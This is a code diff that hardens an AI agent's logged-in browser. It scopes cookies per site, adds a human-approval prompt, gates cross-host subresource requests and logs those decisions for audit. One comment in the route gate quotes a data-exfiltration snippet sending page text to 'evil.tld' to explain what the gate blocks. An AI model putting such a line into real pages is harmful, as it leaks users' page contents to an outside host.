@@ -682,6 +682,29 @@ def _from_playwright_cookies(cookies: list[dict]) -> list[dict]:
     return out
 
 
+def _url_host(url: str) -> str:
+    """Lowercased hostname, or "" for anything that has none."""
+    try:
+        from urllib.parse import urlparse
+        return (urlparse(url).hostname or "").lower()
+    except Exception:
+        return ""
+
+
+def _route_method(route) -> str:
+    try:
+        return route.request.method or ""
+    except Exception:
+        return ""
+
+
+def _route_resource_type(route) -> str:
+    try:
+        return route.request.resource_type or ""
+    except Exception:
+        return ""
+
+
 def _domain_matches(url: str, etld1: str) -> bool:
     """Check whether URL host is the same eTLD+1 as `etld1` (or a
     subdomain of it). Prevents leaking cookies to unrelated hosts that
@@ -830,6 +853,19 @@ def get_pending_auth_approvals() -> dict[str, dict]:
 # How long a headless auth request waits for a human before it is refused.
 _HEADLESS_APPROVAL_TIMEOUT_SEC = 120
 
+# The person has just closed a login window, so they are at the screen.
+_LOGIN_APPROVAL_TIMEOUT_SEC = 180
+
+APPROVAL_APPROVED = "approved"
+APPROVAL_REJECTED = "rejected"
+APPROVAL_TIMEOUT = "timeout"
+APPROVAL_NO_UI = "no_ui"
+
+# What the request is about. The dialog is one surface; the two questions it
+# puts are not the same question.
+APPROVAL_KIND_HEADLESS_USE = "headless_use"
+APPROVAL_KIND_LOGIN = "login_window"
+
 
 class _CrossLoopSignal:
     """One-shot signal set from any loop, awaited on the loop that made it.
@@ -860,6 +896,82 @@ class _CrossLoopSignal:
 
     async def wait(self) -> None:
         await self._event.wait()
+
+
+async def _ask_human_to_approve(
+    local_api,
+    *,
+    kind: str,
+    agent_id: str,
+    agent_name: str,
+    domain: str,
+    url: str,
+    conversation_id: str,
+    conversation_title: str,
+    question: str,
+    evidence: dict | None = None,
+    timeout_sec: float,
+) -> str:
+    """Put one yes/no question to the person at the UI and wait for it.
+
+    Returns APPROVAL_APPROVED, APPROVAL_REJECTED, APPROVAL_TIMEOUT or
+    APPROVAL_NO_UI. Only the first is a yes: a timeout and an absent UI are
+    both "nobody answered", which the caller must not spend as consent.
+
+    `evidence` travels to the dialog as context for the person and is read
+    by nothing that grants — the answer is the only thing that does."""
+    if local_api is None or not getattr(local_api, "has_clients", True):
+        return APPROVAL_NO_UI
+
+    import uuid as _uuid
+
+    request_id = _uuid.uuid4().hex[:12]
+    signal = _CrossLoopSignal()
+    _pending_auth_approvals[request_id] = {
+        "event": signal,
+        "kind": kind,
+        "agent_id": agent_id,
+        "domain": domain,
+        "url": url,
+        "approved": False,
+    }
+    answered = False
+    try:
+        await local_api.broadcast_event(
+            "web_auth_headless_approval_request",
+            {
+                "request_id": request_id,
+                "kind": kind,
+                "agent_id": agent_id,
+                "agent_name": agent_name,
+                "domain": domain,
+                "url": url,
+                "conversation_id": conversation_id,
+                "conversation_title": conversation_title,
+                "question": question,
+                "evidence": evidence or {},
+                "timeout_sec": timeout_sec,
+            },
+        )
+        try:
+            await asyncio.wait_for(signal.wait(), timeout=timeout_sec)
+            answered = True
+        except asyncio.TimeoutError:
+            answered = False
+    except Exception as exc:
+        # The question never reached anybody. Saying "rejected" would put a
+        # refusal in the audit that no person made.
+        log.warning("approval request (%s, %s) could not be sent: %s",
+                    kind, domain, exc)
+        _pending_auth_approvals.pop(request_id, None)
+        return APPROVAL_NO_UI
+    finally:
+        entry = _pending_auth_approvals.pop(request_id, {})
+    if entry.get("approved"):
+        # Checked before `answered`, so an answer that lands between the
+        # timeout and this pop is still the person's answer.
+        return APPROVAL_APPROVED
+    return APPROVAL_REJECTED if answered else APPROVAL_TIMEOUT
 
 
 def _get_session_lock(agent_id: str) -> asyncio.Lock:
@@ -1436,6 +1548,7 @@ class AuthBrowser:
         headed: bool = False,
         domain: str | None = None,
         anonymous: bool = False,
+        login_window: bool = False,
     ):
         from dpc_client_core import web_auth
 
@@ -1447,6 +1560,19 @@ class AuthBrowser:
         # Without this the fallback inherited the agent's whole login and ran
         # it as a second, concurrent browser against the same account.
         self._anonymous = anonymous
+        # The human types the password here. Deliberately NOT a second
+        # meaning for `anonymous`: that flag already means "writes nothing
+        # back", and the login window's whole point is that it writes.
+        self._login_window = login_window
+        self._login_cookie_fingerprint: str | None = None
+        # Evidence, never a decision. The baseline is whatever the site
+        # handed the first, anonymous load; the diff against it is context a
+        # person may be shown when asked, and is read by nothing that grants.
+        self._login_baseline_cookies: set[tuple[str, str]] | None = None
+        self._login_seen_cookies: set[tuple[str, str]] = set()
+        # In-scope cookies THIS window wrote, which is what distinguishes a
+        # window that captured something from a jar that was already there.
+        self._login_written = 0
         # Normalize: accept either `domains=[...]` (new multi-domain) or
         # `domain="..."` (legacy single-domain). Both produce a list.
         if domain is not None and domains is None:
@@ -1455,7 +1581,26 @@ class AuthBrowser:
             raise ValueError("AuthBrowser: pass `domains` or `domain`, not both")
         domains = domains or []
         self._domains = [d.lower() for d in domains]
-        self._etld1s = {web_auth.resolve_etld1(d) for d in self._domains}
+        # Cleanliness of the *start*, kept apart from `_domains`, which is
+        # the scope of the *write*. Fusing them would make `domains=[S]` —
+        # needed so the route gate exists and the vault write is scoped to
+        # S — pull S's stored cookies into the window that is supposed to
+        # have nothing in it to steal.
+        #
+        # An unscoped session is clean for the opposite reason: it may go
+        # anywhere, so it must arrive as nobody. What a non-clean session
+        # loads is the vault jar for its own scope and nothing else — see
+        # `_open`.
+        self._start_clean = anonymous or login_window or not self._domains
+        # `resolve_etld1` answers None for a public suffix (`com`), an
+        # address or a bare label — none of which names a site. Dropping
+        # them keeps the route gate fail-closed: a session left with an
+        # empty `_etld1s` blocks every request rather than admitting all
+        # of `.com` through `_domain_matches`.
+        self._etld1s = {
+            e for e in (web_auth.resolve_etld1(d) for d in self._domains)
+            if e is not None
+        }
         # Backward-compat single-domain alias used by ADR-028 callers.
         self._domain = self._domains[0] if self._domains else None
         self._etld1 = next(iter(self._etld1s), None)
@@ -1465,6 +1610,9 @@ class AuthBrowser:
         self._context = None
         self._page = None
         self._domain_blocks = 0
+        # Repeated gate decisions, folded by `_note_gate_event` and emitted
+        # as one summary row each at close.
+        self._gate_events: dict[tuple, dict] = {}
         self._disconnected = False
         self._last_refs: dict[str, dict] = {}
         # Scopes the `data-dpc-el` marks to one snapshot, so a mark left on an
@@ -1659,49 +1807,21 @@ class AuthBrowser:
                 self._agent_id, e,
             )
 
-        state_path = self._state_path()
-        context_kwargs: dict = {}
-        if self._anonymous:
-            log.debug(
-                "anonymous browser for agent=%s — no saved login loaded",
-                self._agent_id,
-            )
-        elif state_path.exists():
-            try:
-                state_data = json.loads(state_path.read_text(encoding="utf-8"))
-                # Strip origins (localStorage/sessionStorage) — they cause
-                # Firefox to briefly visit each origin on context creation,
-                # which makes previous URLs flash in the address bar.
-                # Cookies are the only cross-session state we need.
-                if state_data.get("origins"):
-                    state_data["origins"] = []
-                    tmp = state_path.with_suffix(".json.tmp")
-                    tmp.write_text(
-                        json.dumps(state_data), encoding="utf-8"
-                    )
-                    context_kwargs["storage_state"] = str(tmp)
-                else:
-                    context_kwargs["storage_state"] = str(state_path)
-            except (json.JSONDecodeError, OSError) as e:
-                log.warning(
-                    "storage_state parse error at %s, falling back to vault: %s",
-                    state_path, e,
-                )
-
-        self._context = self._browser.new_context(**context_kwargs)
+        # No `storage_state`, for any session. browser_state.json accumulated
+        # every cookie the agent had ever collected across every site, and
+        # loading it made a `use_auth=S` browser arrive holding identities
+        # for sites nobody had approved — the approval gate guarding one door
+        # while the identity came through another. A session's identity is
+        # now exactly the vault jar for its own scope, and a clean-start
+        # session has none at all.
+        self._context = self._browser.new_context()
         self._install_domain_route_handler()
 
-        # Vault is the canonical source for cookies; storage_state is kept
-        # only for localStorage/sessionStorage and as a starting point for
-        # cookies the browser may have rotated mid-session. After loading
-        # storage_state, always overlay vault cookies for every configured
-        # domain: add_cookies() replaces by name+domain+path, so vault
-        # entries win on conflict and storage_state-only cookies survive.
-        # skip_missing=True keeps the open path tolerant of domains whose
-        # vault entries are absent/expired — storage_state still covers
-        # them, and any genuine re-login need surfaces on the first
-        # request that hits a protected resource.
-        if self._domains:
+        # skip_missing=True keeps the open path tolerant of a scope whose
+        # vault entry is absent or expired: nothing else can cover the gap
+        # now, so the re-login need surfaces at the first protected request
+        # rather than failing a session that may never make one.
+        if self._domains and not self._start_clean:
             self._inject_vault_cookies(
                 domains=list(self._domains), skip_missing=True
             )
@@ -1709,10 +1829,6 @@ class AuthBrowser:
         self._page = self._context.new_page()
         _attach_page_diagnostics(self._page, agent_id=self._agent_id)
         _active_camoufox_browsers.add(self)
-
-    def _state_path(self) -> Path:
-        home = Path(os.environ.get("DPC_HOME", Path.home() / ".dpc"))
-        return home / "agents" / self._agent_id / "browser_state.json"
 
     def _inject_vault_cookies(
         self,
@@ -1725,9 +1841,32 @@ class AuthBrowser:
             )
         )
 
-    def _sync_cookies_to_vault(self, cookies: list[dict]) -> None:
-        if not cookies or not self._etld1s:
-            return
+    def _sync_cookies_to_vault(self, cookies: list[dict]) -> int:
+        """Write the session's in-scope cookies to the vault; return how
+        many were written.
+
+        Cookies only. No call here can create an approval — `save_cookies`
+        is invoked without `approved_via`, so a jar that was never approved
+        stays unapproved however many times a page load refreshes it.
+
+        A login window with an empty `_etld1s` would save nothing and say
+        nothing — window closes, cookies exist, vault stays empty — so the
+        two silent-no-op branches speak up on that path."""
+        if not self._etld1s:
+            if self._login_window:
+                log.error(
+                    "login window (agent=%s, domains=%s) has no eTLD+1 scope "
+                    "— nothing can be saved and no approval recorded",
+                    self._agent_id, self._domains,
+                )
+            return 0
+        if not cookies:
+            if self._login_window:
+                log.info(
+                    "login window (agent=%s, %s) holds no cookies yet",
+                    self._agent_id, sorted(self._etld1s),
+                )
+            return 0
         from dpc_client_core import web_auth
 
         by_etld1: dict[str, list[dict]] = {}
@@ -1745,76 +1884,135 @@ class AuthBrowser:
             by_etld1.setdefault(matched, []).append(c)
 
         snake = {d: _from_playwright_cookies(items) for d, items in by_etld1.items()}
+        written = 0
         for domain, items in snake.items():
             web_auth.save_cookies(self._agent_id, domain, items)
+            written += len(items)
+        if self._login_window and not snake:
+            log.warning(
+                "login window (agent=%s, %s) closed with cookies for other "
+                "hosts only — no approval recorded",
+                self._agent_id, sorted(self._etld1s),
+            )
+        return written
 
-    def _save_storage_state(self) -> None:
+    def capture_login_cookies(self) -> int:
+        """Snapshot a live login window's cookies into the vault.
+
+        Polled rather than done once at close, because the human closing
+        the window is exactly the case where `close()` finds the context
+        already dead and skips every live-only step. Returns the number of
+        in-scope cookies written, 0 when nothing changed since the last
+        capture."""
+        if not self._login_window:
+            raise RuntimeError("capture_login_cookies is for login windows only")
+        if self._context is None or self._disconnected:
+            return 0
+        try:
+            cookies = self._context.cookies()
+        except Exception as exc:
+            log.debug(
+                "login window cookie read failed (agent=%s): %s",
+                self._agent_id, exc,
+            )
+            return 0
+        fingerprint = json.dumps(
+            sorted(
+                (c.get("name", ""), c.get("domain", ""),
+                 c.get("path", ""), c.get("value", ""))
+                for c in cookies
+            ),
+        )
+        seen = {
+            (c.get("name", ""), (c.get("domain") or "").lstrip(".").lower())
+            for c in cookies
+        }
+        if self._login_baseline_cookies is None:
+            # First poll after the site's own landing page loaded, so this
+            # is the set a site hands any anonymous visitor.
+            self._login_baseline_cookies = seen
+        self._login_seen_cookies = seen
+        if fingerprint == self._login_cookie_fingerprint:
+            return 0
+        self._login_cookie_fingerprint = fingerprint
+        written = self._sync_cookies_to_vault(cookies)
+        self._login_written += written
+        return written
+
+    def login_cookie_evidence(self) -> dict:
+        """What appeared beyond the anonymous first load.
+
+        Shown to the person being asked, and used to decide whether asking
+        is worth it. It decides nothing itself: a jar of guest cookies and a
+        jar carrying a real session both take the same route to the same
+        question, and only the answer grants."""
+        baseline = self._login_baseline_cookies or set()
+        new = sorted(
+            name for name, _domain in (self._login_seen_cookies - baseline) if name
+        )
+        return {
+            "baseline_count": len(baseline),
+            "now_count": len(self._login_seen_cookies),
+            "new_cookie_names": new,
+            "written": self._login_written,
+        }
+
+    def _persist_session_cookies(self) -> None:
+        """Copy this session's in-scope cookies into the vault.
+
+        browser_state.json is neither read (see `_open`) nor written any
+        more — the file on disk is left alone, but nothing here maintains
+        it."""
         if self._context is None:
             return
-        if self._anonymous:
-            # It never held the agent's login, so it has nothing to
-            # contribute — and writing here would overwrite the file the
-            # interactive session owns with a session that knows nothing.
+        if self._anonymous or self._open_scope:
+            # Carries no identity and owns no jar, so it has nothing to say.
+            return
+        if self._login_window:
+            self.capture_login_cookies()
             return
         if self._disconnected:
-            # Browser already detached (e.g. user closed the window): the
-            # context is dead, so storage_state() would only raise and the
-            # cookies are unreadable. Skip quietly instead of WARNING-spamming.
             log.debug(
-                "storage_state save skipped for agent=%s (browser already closed)",
+                "cookie writeback skipped for agent=%s (browser already closed)",
                 self._agent_id,
             )
             return
         try:
-            state_path = self._state_path()
-            state_path.parent.mkdir(parents=True, exist_ok=True)
-            tmp_path = state_path.with_suffix(".json.tmp")
-            # Cookies only, deliberately. `storage_state()` also collects
-            # localStorage, and Firefox reads it by *opening a window on each
-            # origin* — measured: a save with two origins peaked at two extra
-            # visible windows, appearing and vanishing within a second. This
-            # runs after every navigate and at close, which is the flicker of
-            # windows opening and closing that the user kept seeing.
-            #
-            # Nothing is lost: the load path strips origins before handing the
-            # state to new_context, for the same reason in reverse ("they
-            # cause Firefox to briefly visit each origin on context creation").
-            # So the localStorage we paid those windows to collect was written
-            # to disk and then discarded on the next open.
-            state = {"cookies": self._context.cookies(), "origins": []}
-            tmp_path.write_text(json.dumps(state), encoding="utf-8")
-            os.replace(tmp_path, state_path)
-            if os.name == "posix":
-                try:
-                    os.chmod(state_path, 0o600)
-                except OSError as chmod_err:
-                    log.warning(
-                        "storage_state chmod failed for agent=%s: %s",
-                        self._agent_id, chmod_err,
-                    )
-            if state is not None:
-                self._sync_cookies_to_vault(state.get("cookies", []))
+            self._sync_cookies_to_vault(self._context.cookies())
         except Exception as e:
             if self._disconnected:
-                # Disconnect fired *during* storage_state() (manual close
-                # race): expected, not a real failure — keep it at DEBUG.
                 log.debug(
-                    "storage_state save skipped for agent=%s "
+                    "cookie writeback skipped for agent=%s "
                     "(browser closed mid-save): %s",
                     self._agent_id, e,
                 )
             else:
                 log.warning(
-                    "storage_state save failed for agent=%s: %s",
+                    "cookie writeback failed for agent=%s: %s",
                     self._agent_id, e,
                 )
 
     def _install_domain_route_handler(self) -> None:
+        """Install the gate on every context, scoped or not.
+
+        Returning early for an unscoped session left the one path where a
+        browser carried the agent's saved cookies and answered to nobody.
+        An open-scope session costs one Python callback per request, which
+        is why `_domain_route_gate` answers that case first."""
         if self._context is None:
             return
-        if not self._domains:
-            return
         self._context.route("**/*", self._domain_route_gate)
+
+    @property
+    def _open_scope(self) -> bool:
+        """No scope was asked for, so none is enforced — and in exchange the
+        session carries no identity (`_start_clean`, set in `__init__`).
+
+        Distinct from `_domains` non-empty with `_etld1s` empty, which is a
+        scope that was asked for and could not be resolved: that one denies
+        everything, because admitting `.com` is not what `domains=["com"]`
+        was meant to say."""
+        return not self._domains
 
     def _domain_route_gate(self, route) -> None:
         try:
@@ -1827,7 +2025,36 @@ class AuthBrowser:
                 pass
             return
 
-        if not url.startswith(("http://", "https://")):
+        if self._open_scope or not url.startswith(("http://", "https://")):
+            try:
+                route.continue_()
+            except Exception:
+                pass
+            return
+
+        if self._login_window:
+            # Deliberately ungated, on the argument the login-window design
+            # rests on: this browser started with no storage_state and no
+            # vault cookies, so there is nothing in it to exfiltrate. A GET
+            # that carries data out in its URL can carry only what the person
+            # typed into an empty browser, which is what they opened it to
+            # send.
+            #
+            # Allowlisting the site plus its identity providers is not the
+            # narrower option it looks like: a sign-in reaches whatever the
+            # site delegates to, including anti-bot gates that POST, which
+            # the manifest path never admits — so the window built for
+            # logging in prevents logging in.
+            #
+            # The *write* stays scoped: `_sync_cookies_to_vault` stores only
+            # cookies matching `_etld1s`, so a window that walks to an
+            # identity provider saves nothing for it.
+            self._note_gate_event(
+                self.GATE_ACTION_LOGIN_PASSTHROUGH, url, "ok",
+                site=self._etld1 or "", host=_url_host(url), initiator="",
+                method=_route_method(route),
+                resource_type=_route_resource_type(route),
+            )
             try:
                 route.continue_()
             except Exception:
@@ -1835,16 +2062,14 @@ class AuthBrowser:
             return
 
         if not self._etld1s:
-            self._on_domain_blocked(url, "")
+            self._on_domain_blocked(url, _url_host(url))
             try:
                 route.abort()
             except Exception:
                 pass
             return
 
-        from urllib.parse import urlparse
-
-        host = (urlparse(url).hostname or "").lower()
+        host = _url_host(url)
         for allowed in self._etld1s:
             if _domain_matches(url, allowed):
                 try:
@@ -1853,32 +2078,239 @@ class AuthBrowser:
                     pass
                 return
 
-        self._on_domain_blocked(url, host)
+        # A site's own bundle lives on CDN hosts the allowlist never names
+        # (x.com boots from abs.twimg.com, ozon.ru styles from st.ozone.ru),
+        # so a name-by-name list can only ever render sites partially. A
+        # GET/HEAD *subresource* passes when both ends are constrained: the
+        # initiating frame is inside the allowlist, and the host being
+        # contacted is one this site's manifest names. Constraining only the
+        # initiator would leave `new Image().src = "https://evil.tld/?d=" +
+        # document.body.innerText` — a GET carries data out in its URL — and
+        # `<script src>` running foreign code inside the authenticated origin.
+        # Navigation is excluded explicitly rather than by method, because a
+        # document request carries the current frame too.
+        request = route.request
+        _method = ""
+        _resource_type = ""
+        try:
+            _is_nav = (
+                request.is_navigation_request()
+                or request.resource_type == "document"
+            )
+            _method = request.method or ""
+            _resource_type = request.resource_type or ""
+            _method_ok = _method in ("GET", "HEAD")
+            _frame = request.frame
+            _frame_url = _frame.url if _frame is not None else ""
+        except Exception:
+            _is_nav, _method_ok, _frame_url = False, False, ""
+        _frame_site = None
+        if _frame_url.startswith(("http://", "https://")):
+            _frame_site = next(
+                (a for a in self._etld1s if _domain_matches(_frame_url, a)), None
+            )
+        if _method_ok and not _is_nav and _frame_site is not None:
+            from dpc_client_core import web_auth
+
+            if host in web_auth.cdn_manifest_hosts(_frame_site):
+                self._on_subresource_passed(
+                    url, host, site=_frame_site, initiator=_frame_url,
+                    method=_method, resource_type=_resource_type,
+                )
+                try:
+                    route.continue_()
+                except Exception:
+                    pass
+                return
+            self._on_subresource_unlisted(
+                url, host, site=_frame_site, initiator=_frame_url,
+                method=_method, resource_type=_resource_type,
+            )
+            try:
+                route.abort()
+            except Exception:
+                pass
+            return
+
+        self._on_domain_blocked(
+            url, host, site=_frame_site or self._etld1 or "",
+            initiator=_frame_url,
+            method=_method, resource_type=_resource_type,
+        )
         try:
             route.abort()
         except Exception:
             pass
 
-    def _on_domain_blocked(self, url: str, etld1: str) -> None:
-        # `etld1` here is the BLOCKED domain, not an auth domain.
-        self._domain_blocks += 1
+    # Audit actions the gate emits. A request refused as unlisted is a
+    # candidate for the manifest; one refused outright is not, and telling
+    # them apart in the log is the difference between "this site needs a
+    # host" and "something tried to leave".
+    GATE_ACTION_PASSTHROUGH = "subresource_passthrough"
+    GATE_ACTION_UNLISTED = "subresource_blocked_unlisted"
+    GATE_ACTION_BLOCKED = "domain_blocked"
+    # A login window enforces nothing, so its rows are not passthroughs
+    # through a gate — they are the trail of where an ungated window went.
+    GATE_ACTION_LOGIN_PASSTHROUGH = "login_window_passthrough"
+    GATE_SUMMARY_SUFFIX = "_summary"
+
+    def _note_gate_event(
+        self, action: str, url: str, result: str, *,
+        site: str, host: str, initiator: str, method: str, resource_type: str,
+    ) -> bool:
+        """Write the first of a repeating gate decision and count the rest.
+
+        A page load repeats the same (site, host, method, kind) decision
+        hundreds of times, and one synchronous file open per repeat buried
+        the `domain_blocked` rows the audit exists for. The first occurrence
+        is always written — a count that arrives at close is no substitute
+        for knowing when a host first appeared — and the repeats are folded
+        into one summary row by `_flush_gate_audit`. Returns True when this
+        was the first occurrence."""
+        key = (action, site, host, method, resource_type)
+        rec = self._gate_events.get(key)
+        if rec is not None:
+            rec["count"] += 1
+            return False
+        self._gate_events[key] = {
+            "action": action, "result": result, "site": site, "host": host,
+            "method": method, "resource_type": resource_type,
+            "url": url, "initiator": initiator, "count": 1,
+        }
+        self._audit_gate_row(
+            action, url, result, site=site, dest_host=host,
+            initiator=initiator, method=method, resource_type=resource_type,
+            first_seen=True,
+        )
+        return True
+
+    def _audit_gate_row(self, action: str, url: str, result: str, **fields) -> None:
+        # Audit failure must never alter a request — the caller's decision is
+        # already made by the time this runs.
         try:
             from dpc_client_core import web_auth
             web_auth.log_browser_action(
                 agent_id=self._agent_id,
-                domain=etld1,
-                action="domain_blocked",
+                domain=fields.get("dest_host") or "",
+                action=action,
                 url=url,
-                result="denied",
+                result=result,
+                **fields,
             )
         except Exception as exc:
-            log.warning("audit emit failed (domain_blocked %s): %s", url, exc)
+            log.warning("audit emit failed (%s %s): %s", action, url, exc)
+
+    def _flush_gate_audit(self) -> None:
+        """One summary row per repeated decision, and the refusal counts
+        the first-seen writes did not yet carry. Called from `close()`."""
+        from dpc_client_core import web_auth
+
+        _reason_of = {
+            self.GATE_ACTION_UNLISTED: web_auth.REFUSAL_REASON_UNLISTED,
+            self.GATE_ACTION_BLOCKED: web_auth.REFUSAL_REASON_BLOCKED,
+        }
+        pending, self._gate_events = self._gate_events, {}
+        refusals: list[tuple] = []
+        for rec in pending.values():
+            repeats = rec["count"] - 1
+            if repeats <= 0:
+                continue
+            self._audit_gate_row(
+                rec["action"] + self.GATE_SUMMARY_SUFFIX,
+                rec["url"], rec["result"],
+                site=rec["site"], dest_host=rec["host"],
+                initiator=rec["initiator"], method=rec["method"],
+                resource_type=rec["resource_type"], count=rec["count"],
+            )
+            reason = _reason_of.get(rec["action"])
+            if reason is not None and rec["site"] and rec["host"]:
+                refusals.append(
+                    (rec["site"], rec["host"], repeats, reason)
+                )
+        if refusals:
+            try:
+                web_auth.record_cdn_refusals(self._agent_id, refusals)
+            except Exception as exc:
+                log.warning("CDN refusal flush failed: %s", exc)
+
+    def _on_subresource_passed(
+        self, url: str, host: str, *, site: str = "", initiator: str = "",
+        method: str = "", resource_type: str = "",
+    ) -> None:
+        # Allow-side mirror of `_on_domain_blocked`: the audit trail must be
+        # able to answer "what did the gate let through", not only what it cut.
+        # For a passthrough the security-relevant fact is who initiated it.
+        self._note_gate_event(
+            self.GATE_ACTION_PASSTHROUGH, url, "ok",
+            site=site, host=host, initiator=initiator,
+            method=method, resource_type=resource_type,
+        )
+
+    def _on_subresource_unlisted(
+        self, url: str, host: str, *, site: str, initiator: str = "",
+        method: str = "", resource_type: str = "",
+    ) -> None:
+        """Refused because the site's manifest does not name this host —
+        and recorded so a human can later be asked about it.
+
+        The record confers nothing. It is written to a different file from
+        the manifest the gate reads, so the act of trying can never be the
+        act of being allowed."""
+        self._domain_blocks += 1
+        first = self._note_gate_event(
+            self.GATE_ACTION_UNLISTED, url, "denied",
+            site=site, host=host, initiator=initiator,
+            method=method, resource_type=resource_type,
+        )
+        if first:
+            try:
+                from dpc_client_core import web_auth
+                web_auth.record_cdn_refusals(
+                    self._agent_id,
+                    [(site, host, 1, web_auth.REFUSAL_REASON_UNLISTED)],
+                )
+            except Exception as exc:
+                log.warning("CDN refusal write failed (%s): %s", host, exc)
+
+    def _on_domain_blocked(
+        self, url: str, etld1: str, *, site: str = "", initiator: str = "",
+        method: str = "", resource_type: str = "",
+    ) -> None:
+        """Refused outright — wrong method, a navigation, or a scope that
+        resolved to nothing.
+
+        Recorded too, and for the same reason as the manifest branch: a host
+        refused here left no trace at all, so a site broken by this branch
+        stayed broken with nothing for a human to act on. The refusal
+        carries which branch made it, because promoting a host the
+        manifest path never consults would not unblock it."""
+        # `etld1` here is the BLOCKED domain, not an auth domain.
+        self._domain_blocks += 1
+        first = self._note_gate_event(
+            self.GATE_ACTION_BLOCKED, url, "denied",
+            site=site, host=etld1, initiator=initiator,
+            method=method, resource_type=resource_type,
+        )
+        if first and site and etld1:
+            try:
+                from dpc_client_core import web_auth
+                web_auth.record_cdn_refusals(
+                    self._agent_id,
+                    [(site, etld1, 1, web_auth.REFUSAL_REASON_BLOCKED)],
+                )
+            except Exception as exc:
+                log.warning("CDN refusal write failed (%s): %s", etld1, exc)
 
     def _current_etld1(self) -> str:
         if self._page is not None:
             try:
                 from dpc_client_core import web_auth
-                return web_auth.resolve_etld1(self._page.url)
+                # None on an about:/data: page or a bare-label host — fall
+                # through to the session's own domain rather than writing
+                # `null` into the audit trail.
+                current = web_auth.resolve_etld1(self._page.url)
+                if current is not None:
+                    return current
             except Exception:
                 pass
         return self._etld1 or "unknown"
@@ -1913,8 +2345,19 @@ class AuthBrowser:
         route handler installed in `_install_domain_route_handler` is
         the authoritative gate that also catches in-page redirects and
         XHR — this method is the convenience layer in front of it."""
+        if self._open_scope:
+            return  # nothing was scoped, so nothing is off-scope
+        if self._login_window:
+            return  # the gate lets this window anywhere; agreeing here is
+            # what keeps the two layers saying the same thing
         if not self._etld1s:
-            return  # session opened without any auth domain (rare; tests)
+            # A scope was asked for and none of it resolved to a registrable
+            # domain. The gate denies every request in that state; agreeing
+            # with it here is what makes the two layers say the same thing.
+            raise ValueError(
+                f"URL {url!r} is outside auth domains: none of "
+                f"{self._domains!r} names a registrable domain"
+            )
         for etld1 in self._etld1s:
             if _domain_matches(url, etld1):
                 return
@@ -2012,7 +2455,7 @@ class AuthBrowser:
         if status is not None and status >= 400:
             snapshot_text = f"{HTTP_ERROR_PREFIX}{status}\n\n{snapshot_text}"
         try:
-            self._save_storage_state()
+            self._persist_session_cookies()
         except Exception as exc:
             log.debug("post-navigate cookie writeback failed: %s", exc)
         return snapshot_text
@@ -2485,6 +2928,13 @@ class AuthBrowser:
         (observed 2026-08-12 17:32) — which is why the thread it runs on is a
         daemon `_PinnedThread` rather than a pool worker the interpreter
         joins. Registry / lock / thread teardown always runs too."""
+        # Outside the `_disconnected` guard: the coalesced gate counts are
+        # file writes that owe nothing to a live browser, and a window the
+        # person closed is exactly when they must still land.
+        try:
+            self._flush_gate_audit()
+        except Exception as exc:
+            log.warning("gate audit flush failed for agent=%s: %s", self._agent_id, exc)
         try:
             if not self._disconnected:
                 url = ""
@@ -2496,10 +2946,10 @@ class AuthBrowser:
                 self._audit_action("close", url, "ok")
                 if self._context is not None:
                     try:
-                        self._save_storage_state()
+                        self._persist_session_cookies()
                     except Exception as exc:
                         log.warning(
-                            "storage_state save during close failed for agent=%s: %s",
+                            "cookie writeback during close failed for agent=%s: %s",
                             self._agent_id, exc,
                         )
         finally:
@@ -2594,6 +3044,32 @@ class AuthBrowser:
         self._shutdown_executor()
 
 
+def _requested_scope(domains: list[str] | None) -> frozenset[str] | None:
+    """The scope a session built from `domains` would enforce.
+
+    `None` for the unscoped session, which enforces nothing and carries no
+    identity; a set of eTLD+1s otherwise. `None` and `frozenset()` are
+    different answers — the second is a scope that was asked for and
+    resolved to nothing, and it denies everything."""
+    from dpc_client_core import web_auth
+
+    if not domains:
+        return None
+    return frozenset(
+        e for e in (web_auth.resolve_etld1(d) for d in domains) if e is not None
+    )
+
+
+def _session_scope_matches(session: "AuthBrowser", domains: list[str] | None) -> bool:
+    """Whether a live session may serve a call asking for `domains`.
+
+    Equality, not containment, in either direction: a wider live session
+    answers a narrower request with reachability nobody asked for, and a
+    narrower one spends an identity the caller did not ask for."""
+    live = None if session._open_scope else frozenset(session._etld1s)
+    return live == _requested_scope(domains)
+
+
 def _get_or_create_session(
     agent_id: str, domains: list[str], headed: bool
 ) -> AuthBrowser:
@@ -2601,9 +3077,10 @@ def _get_or_create_session(
 
     Ark's D2 duplicate-open guard: a second `browser_*` tool call on
     the same agent reuses the live session instead of opening a second
-    Camoufox subprocess. Domains/headed args apply only when a NEW
-    session is created — switching modes mid-flight requires explicit
-    `browser_close` first.
+    Camoufox subprocess. `headed` applies only when a NEW session is
+    created; `domains` does not — a live session whose scope differs is
+    closed and replaced, because reuse that ignored the argument is how an
+    unscoped browser came to serve an authenticated call.
 
     Sync entry point — caller MUST be already running in the session's
     own thread (or this is the first call and the new session's
@@ -2614,6 +3091,17 @@ def _get_or_create_session(
         try:
             if existing._page.is_closed():
                 log.info("Stale session for %s (page closed) — recreating", agent_id)
+                _active_browser_sessions.pop(agent_id, None)
+            elif not _session_scope_matches(existing, domains):
+                log.info(
+                    "Session for %s is scoped to %s, call asks for %s — "
+                    "replacing it rather than serving the wrong scope",
+                    agent_id, sorted(existing._etld1s), domains,
+                )
+                try:
+                    existing.close()
+                except Exception as exc:
+                    log.warning("closing mis-scoped session for %s: %s", agent_id, exc)
                 _active_browser_sessions.pop(agent_id, None)
             else:
                 return existing
@@ -2686,7 +3174,9 @@ async def _get_or_create_session_async(
     `_run_in_session` call lands on the same thread.
 
     Uses a per-agent asyncio.Lock to prevent duplicate browser launches
-    when the LLM emits parallel browse_page tool calls in one round."""
+    when the LLM emits parallel browse_page tool calls in one round.
+
+    Reuse is scope-exact — see `_session_scope_matches`."""
     if agent_id not in _session_create_locks:
         _session_create_locks[agent_id] = asyncio.Lock()
     async with _session_create_locks[agent_id]:
@@ -2695,6 +3185,19 @@ async def _get_or_create_session_async(
             try:
                 if existing._page.is_closed():
                     log.info("Stale session for %s (page closed) — recreating", agent_id)
+                    _active_browser_sessions.pop(agent_id, None)
+                elif not _session_scope_matches(existing, domains):
+                    log.info(
+                        "Session for %s is scoped to %s, call asks for %s — "
+                        "replacing it rather than serving the wrong scope",
+                        agent_id, sorted(existing._etld1s), domains,
+                    )
+                    try:
+                        await _run_in_session(existing, "close")
+                    except Exception as exc:
+                        log.warning(
+                            "closing mis-scoped session for %s: %s", agent_id, exc
+                        )
                     _active_browser_sessions.pop(agent_id, None)
                 else:
                     return existing
@@ -2842,6 +3345,253 @@ def _auth_browse(
     return _html_to_markdown(_auth_browse_html(agent_id, domain, url, headed))
 
 
